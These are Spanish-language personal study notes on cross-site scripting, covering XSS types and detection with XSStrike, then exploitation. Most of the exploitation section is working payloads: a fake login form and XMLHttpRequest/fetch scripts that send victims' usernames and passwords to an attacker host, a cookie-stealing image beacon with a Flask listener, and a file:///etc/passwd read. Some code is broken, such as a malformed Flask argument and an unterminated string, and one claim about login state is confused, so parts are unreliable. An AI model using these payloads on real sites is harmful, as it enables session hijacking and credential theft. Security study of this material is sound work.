# XSS

## REFERENCIAS WEB

+ https://www.youtube.com/watch?v=iAZsBOXtyDg
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+ https://portswigger.net/web-security/cross-site-scripting/exploiting

## TEORIA

### ¿QUÉ ES EL XSS?

+ Son las siglas de Cross Site Scripting 
+ Ocurre cuando podemos inyectar código
  JavaScript en una web. Esto se ejecuta en el
lado del cliente 
+ El vector de ataque posible de un XSS se da
  en entradas de usuario no sanitizadas.
(formularios, campos de busqueda, parametros
url...)

### TIPOS COMUNES

+ **REFLECTED**: Un XSS reflejado ocurre cuando un input proporcionado
  por el usuario se devuelve directamente en la respuesta de la web sin
ser validado o escapado. Si ese input contiene código JavaScript, este
se “refleja” en la página y se ejecuta en el navegador de la víctima.

+ **STORED**: El payload malicioso queda
  almacenado en la base de datos o en el
servidor. Cuando un usuario accede a la
información afectada (por ejemplo, un
comentario o perfil), el código se carga y se
ejecuta automáticamente en su navegador.

## DIAGNOSTICO

### DIAGNOSTICO MANUAL

Cuando exista sospecha de que un input puede ser vulnerable a un XSS reflejado, podemos probar el payload más básico: 

```js
<script>alert(1)</script>
```

### DIAGNOSTICO AUTOMATICO

Podemos utilizar la herramienta XSSstrike ante el endpoint que creemos que es vulnerable ante un XSS. 
https://github.com/s0md3v/XSStrike

Se trata de un script en python. Para usarlo: 
```bash
python3 xsstrike.py -u http://web.com/endpoint
```
## EJEMPLOS DE ATAQUE

### EJEMPLOS DE ATAQUE REFLECTED
 
**CAMBIAR FONDO DE ESCRITORIO**
```js
<script>document.body.background+%3d+"http://10.10.10.10/gatito.jpg"</script>

```
Y por el otro lado levantas un servidor simple
en python para hostear la imagen.
```bash
python3 -m http.server 80
```
Esto se esta ejecutando solamente en el navegador, hay que entender eso. 

**CREAR UN FALSO FORMULARIO DE INICIO DE SESIÓN FALSO**
```html
<script>
    document.write('
<form action="http://nuestraIP">
        <h3>Please Login to Continue</h3>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" paceholder="Password">
        <input type="submit" name="submit" value="Login">
</form>');


')
</script>
``` 
Esto solo cambiara en TU navegador, la idea de
ataque aquí es pasarle la URL maliciosa a otro
usuario (vía phishing por ejemplo).  Lo que
hace básicamente el payload es crear un
formulario de inicio de sesión falso en el que
una vez que la victima introduzca sus
credenciales y le de a submit, estas se nos
enviarán por HTTP GET.  De nuestro lado
tendremos que habilitar un listener para
recibir la petición que contendrá la
información: 

```bash
nc -lvnp 80
``` 

**INYECCIÓN DE CÓDIGO CERRANDO TAG HTML**
A veces para inyectar un código como: 
```js
<script>alert(1)</script>
```
Tendrás que "escapar" de los tags HTML.  Por
ejemplo, imagina que puedes inyectar ese
código dentro de unas etiquetas title. Pero no
se interpreta por dichas etiquetas. Para
escaparlo puedes:

```js
</title><script>alert(1)</script>
```
Como ves has escapado la etiqueta title y
luego inyectado el código. 

**INYECCIÓN DE CÓDIGO ABUSANDO DE FUNCIÓN SEARCH**
Ante un endpoint del estilo /search?q=

```js
'%2Balert(1)%2B'
```


## EXPLOTACIÓN

Hasta ahora hemos visto diferentes maneras de lanzar ataques XSS.
Ahora vamos a ver como podemos aprovechar esta vulnerabilidad para
escalarla hacía algo más.

### EXPLOTANDO XSS PARA ROBAR COOKIS DE SESIÓN (cookie hijacking)

Las cookies de sesión sirven para mantener identificado a un usuario en una sesión. Mediante un XSS podemos robar la cookie de sesión de un usuario legitimo, para hacernos pasar por él.
Esto tiene una serie de limitaciones: 
    + El usuario no debe estar logeado
    + La mayoría de aplicaciones esconden sus cookies de Js mediante la
      flag HttpOnly. (para hacer un diagnostico de esto, puedes mirar en
las herramientas del desarrollador > Storage y observar si la flag
HttpOnly esta en false.
    + Las sesiones podrían estar bloqueadas por factores
      adicionales, como las dirección IP del usuario. 
    + La sesión podría expirar antes de que puedas interceptarla.

**SITUACIÓN INCIAL** 
Nos encontramos ante un input vulnerable a un XSS. 
Probamos un simple: 
```js
<script>alert('XSS');</script>
```
Y vemos que este se "refleja" en la web. ¿Cómo podemos aprovechar esta
vulnerabilidad para ganar acceso? ¿Cómo podemos sustraer una cookie de sesión a un usuario?
Partimos de un **payload** básico:
```js
<script>alert(document.cookie);</script>
``` 
Este payload mostrara la cookie de sesión del usuario actual.
Obviamente, si lo lanzamos nosotros mismos, nos mostrará nuestra propia
cookie. Entonces, la idea principal es conseguir que un usuario ejecute
dicho payload. ¿Pero cómo conseguimos que un usuario ejecute algo así?

Antes de nada vamos a configurar un **listener** para recibir las cookies de la victima. Vamos a hacerlo mediante un script de Python. 
```python
from flask import Flask, request, url_for, render_template, redirect, make_response
import requests

app = Flask(__name__, static_url_path'=/static, static_folder='static')
app.config['DEBUG'] = True

@app.route("/<steal_cookie>", methods=['GET'])
def start(steal_cookie):
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```
```bash
sudo python3 listener.py
``` 
Ahora deberíamos conseguir que la victima ejecutará el siguiente
**payload**: 
```js
<script>
    new Image().src = "http://localhost:1337/?stolen_cookie=" + document.cookie;
</script>
```
Ahora si la victima ejecuta dicho payload, a nosotros nos llegaría la cookie por el listener.
Para realizar el cookie hijacking nos hemos de asegurar de que la victima ha hecho login out y copiar la session id en herramientas del desarrollador > Storage

### EXPLOTANDO (BIND) XSS PARA CAPTURAR PASSWORDS 

Podemos capturar la password de un usuario inyectando un payload en un
comentario vulnerable y esperar que algún usuario interactue con el y lo
ejecute. Seria algo así como "tender una trampa". Para este ejemplo
tenemos dos opciones, un payload mediante XMLHttpRequest y otro mediante
FetchAPI.

**XMLHttpRequest PAYLOAD**
```js
<input name=username id=username>
<input type=password name=password id=password onchange="Capture()">
<script>
function Capture()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://domain.com/?username=" + user + "&password=" + pass, true)
xhr.send();
}
</script>
```

**Fetch API PAYLOAD**
```js
<input name=username id=username>
<input type=password name=password onchange="fetch('https://domain.com',
{
method:'POST',
body:username.value+':'+this.value
});">
```
Como **listener** podemos utilizar un simple servidor de python (deberemos establecer un tunel antes):
```bash
python3 -m http.server 8080
``` 
O podemos utilizar interactsh o el collaborator de burpsuite pro como métodos
más sencillos.
https://app.interactsh.com/#/ Obviamente deberemos cambiar el "https://domain.com" del payload por nuestra dirección.

Así, cuando un usuario interactue con el comentario nosotros recibiremos
la petición. Dicha petición contendrá las credenciales del usuario de
forma: user:password. 

Luego utilizaremos estas credenciales robadas para acceder.


**XSS TO LFI (POR PROBAR)**

```js
<script>
    x = new XMLHttpRequest;
    x.onload = function () {
        document.write(this.responseText);
    };
    x.open('GET', 'file:///etc/passwd');
    x.send();
</script>
```

